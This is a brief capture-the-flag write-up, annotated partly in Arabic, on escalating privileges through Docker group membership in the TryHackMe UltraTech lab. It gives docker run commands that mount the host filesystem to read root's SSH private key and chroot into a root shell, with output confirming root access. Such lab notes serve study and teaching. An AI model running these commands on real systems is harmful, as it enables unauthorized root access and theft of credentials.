
# DOCKER (UltraTech room thm)

## Signs 

```shell
id 
r00t@ip-10-82-181-171:/tmp$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

```shell
r00t@ip-10-82-181-171:/tmp$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB
```

```
 docker run --rm -v /:/mnt bash cat /mnt/root/.ssh/id_rsa
```
- `-rm`: يمسح الحاوية فور انتهائها (للنظافة).
    
- `-v /:/mnt`: يربط جذر النظام الحقيقي (`/`) بمجلد داخل الحاوية اسمه `/mnt`.
    
- `bash`: اسم الصورة التي وجدتها عندك.
    
- `cat /mnt/root/.ssh/id_rsa`: يقرأ ملف المفتاح من المسار الحقيقي (عبر المجلد المربوط).

## if we want intractive root 
```shell
docker run --rm -it -v /:/mnt bash
```
- **`-it`**: تسمح لك بالتفاعل مع الحاوية (Interactive Terminal).
    
- **`-v /:/mnt`**: قمنا بربط نظام التشغيل الأصلي بالكامل داخل مجلد `/mnt`.
    
- **`chroot /mnt`**: هذا الأمر يخبر النظام: "اجعل مجلد `/mnt` هو جذر النظام الجديد". هذا يجعلك تنتقل من بيئة الحاوية المعزولة إلى بيئة السيرفر الأصلي بصلاحيات root.

```shell
chroot /mnt
```

result 
```
r00t@ip-10-82-181-171:/tmp$ docker run --rm -it -v /:/mnt bash
bash-5.0# chroot /mnt
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@fa8d198b36b6:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@fa8d198b36b6:/#
```
